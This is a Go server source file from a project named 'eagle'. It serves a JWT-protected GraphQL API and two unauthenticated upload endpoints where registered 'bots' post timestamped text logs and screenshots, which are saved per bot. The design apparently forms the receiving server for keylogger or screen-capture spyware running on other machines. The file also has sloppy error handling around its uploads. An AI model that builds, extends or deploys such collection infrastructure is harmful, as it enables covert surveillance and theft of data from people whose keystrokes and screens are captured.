package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path"
	"time"

	"github.com/99designs/gqlgen/graphql"
	"github.com/99designs/gqlgen/handler"
	"github.com/MShoaei/eagle/api"
	"github.com/MShoaei/eagle/middlewares"
	"github.com/MShoaei/eagle/models"
	"github.com/MShoaei/eagle/utils"
	"github.com/dgrijalva/jwt-go"
	"github.com/dgrijalva/jwt-go/request"
	"github.com/jinzhu/gorm"
	"github.com/kataras/muxie"
	"github.com/spf13/afero"
)

const defaultPort = "3000"

func main() {
	mux := muxie.NewMux()

	exists, err := afero.DirExists(utils.Fs, utils.ProfilesDir)
	if err != nil {
		fmt.Println(err)
		return
	}
	if !exists {
		if err := utils.Fs.MkdirAll(utils.ProfilesDir, os.ModeDir|os.ModePerm); err != nil {
			fmt.Println(err)
			return
		}
	}

	cfg := api.Config{Resolvers: &api.Resolver{DB: models.DB}}
	cfg.Directives.IsAuthenticated = func(ctx context.Context, obj interface{}, next graphql.Resolver) (res interface{}, err error) {
		tokenString := ctx.Value(middlewares.AuthToken("Authorization")).(string)
		tokenString, err = request.AuthorizationHeaderExtractor.Filter(tokenString)
		if err != nil {
			return nil, err
		}

		token, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) {
			if _, ok := token.Method.(*jwt.SigningMethodRSA); !ok {
				return nil, fmt.Errorf("incorrect algorithm")
			}
			return middlewares.VerifyKey, nil
		})
		if err != nil {
			return nil, err
		}
		if !token.Valid {
			return nil, fmt.Errorf("invalid token")
		}
		return next(ctx)
	}

	mux.Handle("/log/:id", muxie.Methods().
		HandleFunc(http.MethodPost,
			func(w http.ResponseWriter, r *http.Request) {
				id := muxie.GetParam(w, "id")
				bot := models.Bot{}
				if err := models.DB.Where("id = ?", id).Find(&bot).Error; err == gorm.ErrRecordNotFound {
					fmt.Fprint(w, http.StatusForbidden)
					return
				}
				file, _, _ := r.FormFile("f")
				newFile, err := utils.Fs.Create(path.Join(utils.ProfilesDir, id, time.Now().Format("2006-01-02T15-04-05Z0700")) + ".txt")
				defer newFile.Close()
				if err != nil {
					fmt.Println(err)
					return
				}
				io.Copy(newFile, file)
				fmt.Fprint(w, http.StatusCreated)
			}))

	mux.Handle("/shot/:id", muxie.Methods().
		HandleFunc(http.MethodPost,
			func(w http.ResponseWriter, r *http.Request) {
				id := muxie.GetParam(w, "id")
				bot := models.Bot{}
				if err := models.DB.Where("id = ?", id).Find(&bot).Error; err == gorm.ErrRecordNotFound {
					fmt.Fprint(w, http.StatusForbidden)
					return
				}
				file, _, _ := r.FormFile("f")
				newFile, err := utils.Fs.Create(path.Join(utils.ProfilesDir, id, "pictures", time.Now().Format("2006-01-02T15-04-05Z0700")) + ".png")
				defer newFile.Close()
				if err != nil {
					fmt.Println(err)
					return
				}
				io.Copy(newFile, file)
				fmt.Fprint(w, http.StatusCreated)
			}))

	mux.Use(middlewares.GetAuthMiddleware)
	mux.Handle("/", muxie.Methods().
		HandleFunc(http.MethodGet,
			handler.Playground("GraphQL playground", "/api")))
	mux.Handle("/api", muxie.Methods().
		Handle(http.MethodPost,
			handler.GraphQL(api.NewExecutableSchema(cfg))))

	port := os.Getenv("PORT")
	if port == "" {
		port = defaultPort
	}

	defer models.DB.Close()

	log.Printf("connect to http://localhost:%s/ for GraphQL playground", port)
	log.Fatal(http.ListenAndServe(":"+port, mux))
}
